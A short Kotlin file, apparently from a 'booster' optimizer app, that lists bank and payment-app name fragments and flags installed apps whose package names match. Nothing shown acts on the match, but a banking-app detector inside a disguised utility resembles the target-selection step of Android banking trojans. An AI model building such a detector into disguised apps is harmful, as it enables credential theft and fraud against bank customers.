package com.sysopt.booster

object BankingDetector {
    private val bankingApps = listOf(
        "chase", "wellsfargo", "bankofamerica", "citi", "citibank",
        "usaa", "capitalone", "tdbank", "td.bank", "pnc",
        "barclays", "hsbc", "ing", "lloyds", "santander",
        "natwest", "rbs", "anz", "westpac", "nab", "cba",
        "commonwealth", "paypal", "google.wallet", "apple.passbook",
        "samsung.spay", "amazon.pay", "venmo", "zelle",
        "revolut", "monzo", "n26", "starling", "wise",
        "transferwise", "skrill", "neteller", "payoneer",
        "stripe", "square", "adyen", "braintree"
    )

    fun isBankingApp(packageName: String): Boolean {
        val lower = packageName.lowercase()
        return bankingApps.any { lower.contains(it) }
    }
}